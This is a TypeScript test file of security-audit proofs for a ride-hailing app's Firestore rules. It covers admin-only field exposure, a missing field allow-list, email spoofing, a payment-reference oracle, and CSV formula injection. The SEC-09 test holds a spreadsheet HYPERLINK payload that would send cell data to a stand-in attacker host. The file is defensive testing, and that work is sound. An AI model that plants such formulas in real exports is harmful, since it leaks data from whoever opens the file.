/// <reference types="node" />

// Audit proofs for findings (docs/review/SECURITY_AUDIT.md: SEC-04, SEC-05, SEC-07, SEC-09).
// Each asserts the SECURE behaviour. Open findings are marked `todo`, so they run and report
// "# TODO" without failing `npm run test:rules`. When a finding is fixed, its `todo` option is
// removed and the test must pass (SEC-09: fixed in Security batch B).
// Self-contained on purpose: Node's type stripping does not resolve the "@/..." aliases.

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { after, before, beforeEach, describe, it } from 'node:test';

import { assertFails, initializeTestEnvironment, type RulesTestEnvironment } from '@firebase/rules-unit-testing';
import {
  collection,
  doc,
  getDoc,
  getDocs,
  query,
  setDoc,
  setLogLevel,
  Timestamp,
  updateDoc,
  where,
  type DocumentData,
  type Firestore,
} from 'firebase/firestore';

import { csvCell } from '../../../admin/src/lib/csv.ts';

setLogLevel('error');

const ATTACKER = 'attackerPassenger';
const DRIVER = 'driver1';
let testEnv: RulesTestEnvironment;

function db(uid: string, claims: Record<string, unknown> = {}): Firestore {
  return testEnv.authenticatedContext(uid, claims).firestore() as unknown as Firestore;
}

async function seed(docs: Record<string, DocumentData>): Promise<void> {
  await testEnv.withSecurityRulesDisabled(async (context) => {
    const firestore = context.firestore() as unknown as Firestore;
    for (const [path, data] of Object.entries(docs)) await setDoc(doc(firestore, path), data);
  });
}

before(async () => {
  testEnv = await initializeTestEnvironment({
    projectId: 'demo-trigo-rules',
    firestore: { rules: readFileSync('firestore.rules', 'utf8') },
  });
});

after(async () => {
  await testEnv?.cleanup();
});

beforeEach(async () => {
  await testEnv.clearFirestore();
  await seed({
    [`users/${ATTACKER}`]: { uid: ATTACKER, role: 'passenger', email: 'a@example.com', fullName: 'A', mobileNumber: '09170000000' },
  });
});

describe('SEC-04 verified driver records expose admin-only fields', () => {
  it('a passenger cannot list drivers with their suspension reason', { todo: 'SEC-04 open: split admin-only driver fields' }, async () => {
    await seed({
      [`drivers/${DRIVER}`]: {
        fullName: 'Pedro Reyes',
        isVerified: true,
        isOnline: true,
        vehicleType: 'tricycle',
        currentLocation: { latitude: 10.04, longitude: 124.34 },
        suspensionReason: 'Harassed a passenger.',
        suspendedBy: 'admin1',
      },
    });
    await assertFails(getDocs(query(collection(db(ATTACKER), 'drivers'), where('isVerified', '==', true))));
  });
});

describe('SEC-05 users/{uid} has no field allow-list', () => {
  it('a passenger cannot store arbitrary fields or a 500 KB name', { todo: 'SEC-05 open: users allow-list' }, async () => {
    await assertFails(
      updateDoc(doc(db(ATTACKER), 'users', ATTACKER), {
        fullName: 'x'.repeat(500000),
        createdAt: Timestamp.fromMillis(0),
        anythingElse: true,
      }),
    );
  });

  it('a new profile cannot claim another email', { todo: 'SEC-05 open: email == auth token email' }, async () => {
    const fresh = testEnv.authenticatedContext('newUser', { email: 'real@example.com' }).firestore() as unknown as Firestore;
    await assertFails(
      setDoc(doc(fresh, 'users', 'newUser'), {
        uid: 'newUser',
        role: 'passenger',
        email: 'ceo@trigo.example',
        fullName: 'TriGo Support',
        mobileNumber: 'not a number',
      }),
    );
  });
});

describe('SEC-07 payment reference oracle', () => {
  it('a user cannot tell a used reference from a free one', { todo: 'SEC-07 open (low, may be accepted)' }, async () => {
    await seed({ 'paymentReferences/1234567890123': { paymentId: 'p1', driverId: 'driver2', createdAt: Timestamp.now() } });
    const free = await getDoc(doc(db(ATTACKER), 'paymentReferences', '9999999999999')).then(() => 'allowed', () => 'denied');
    const used = await getDoc(doc(db(ATTACKER), 'paymentReferences', '1234567890123')).then(() => 'allowed', () => 'denied');
    assert.equal(free, used);
  });
});

describe('SEC-09 CSV formula injection (admin exports)', () => {
  // Fixed (Security batch B): csvCell now lives in admin/src/lib/csv.ts and prefixes ' .
  it('a formula in a driver name is exported inert', () => {
    const cell = csvCell('=HYPERLINK("http://evil.example/?x="&A1,"Pedro")');
    assert.ok(!/^[=+\-@]/.test(cell.replace(/^"/, '')), `exported as ${cell}`);
  });
});
